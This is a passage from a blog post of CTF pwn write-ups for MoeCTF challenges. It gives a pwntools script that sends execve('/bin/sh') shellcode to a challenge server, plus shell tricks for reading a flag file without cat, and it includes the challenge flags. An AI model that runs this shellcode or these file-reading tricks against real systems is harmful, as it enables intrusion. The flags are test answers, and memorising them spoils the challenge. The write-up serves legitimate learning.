<h2 id="è¿™æ˜¯ä»€ä¹ˆshellcode">è¿™æ˜¯ä»€ä¹ˆï¼Ÿshellcodeï¼<a hidden class="anchor" aria-hidden="true" href="#è¿™æ˜¯ä»€ä¹ˆshellcode">#</a></h2>
<p>å†™ä¸€æ®µshellcodeå‘è¿‡å»å³å¯ï¼Œç”¨shellcraftå¥½åƒä¹Ÿèƒ½æ‰“é€š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>) 
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#elf = ELF(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./pwn&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;192.168.1.6&#34;</span>,<span style="color:#ae81ff">7971</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rax,59
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rbx,0x0068732f6e69622f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	push rbx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rdi,rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rsi,0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	mov rdx,0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode = asm(shellcraft.sh())</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>,shellcode)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#moectf{GeTShELl-N3VER-S0-ea5y1a42caf12}</span>
</span></span></code></pre></div><hr>
<h2 id="å“¦ä¸æˆ‘çš„libc">å“¦ä¸ï¼æˆ‘çš„libcï¼<a hidden class="anchor" aria-hidden="true" href="#å“¦ä¸æˆ‘çš„libc">#</a></h2>
<p>éé¢„æœŸï¼Œè¯•äº†ä¸‹å¸¸ç”¨çš„å‘½ä»¤ï¼Œcat ls more less head tailå•¥çš„åŸºæœ¬éƒ½ä¸èƒ½ç”¨äº†ï¼Œä¸è¿‡echoè¿˜èƒ½ç”¨ï¼Œç½‘ä¸Šæ‰¾åˆ°äº†å…³äºechoè¾“å‡ºæ–‡ä»¶å†…å®¹çš„èµ„æ–™ï¼Œå…ˆåˆ©ç”¨$(&lt;/flag.txt)æˆ–è€…`&lt;/flag.txt`è·å¾— <code>/flag.txt</code> æ–‡ä»¶å†…å®¹ä½œä¸ºè¾“å…¥çš„ç»“æœï¼Œå†ç”¨echoè¿›è¡Œè¾“å‡ºï¼Œä¸è¿‡åæ¥åœ¨åšçš„æ—¶å€™å‘ç°ä¸ç”¨echoä¹Ÿè¡Œï¼Œåªä¸è¿‡ä¼šå¤šä¸ªæŠ¥é”™</p>
<p>è¿™å‡ ä¸ªæ–¹æ³•éƒ½èƒ½å‡ºflagï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ret2shell-89-7062:/# echo <span style="color:#66d9ef">$(</span>&lt;/flag.txt<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15<span style="color:#f92672">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ret2shell-89-7062:~# echo <span style="color:#e6db74">`</span>&lt;/flag.txt<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15<span style="color:#f92672">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ret2shell-89-7062:~# <span style="color:#66d9ef">$(</span>&lt;/flag.txt<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>-bash: moectf<span style="color:#f92672">{</span>busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15<span style="color:#f92672">}</span>: command not found
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ret2shell-89-7062:~# <span style="color:#e6db74">`</span>&lt;/flag.txt<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>-bash: moectf<span style="color:#f92672">{</span>busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15<span style="color:#f92672">}</span>: command not found
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
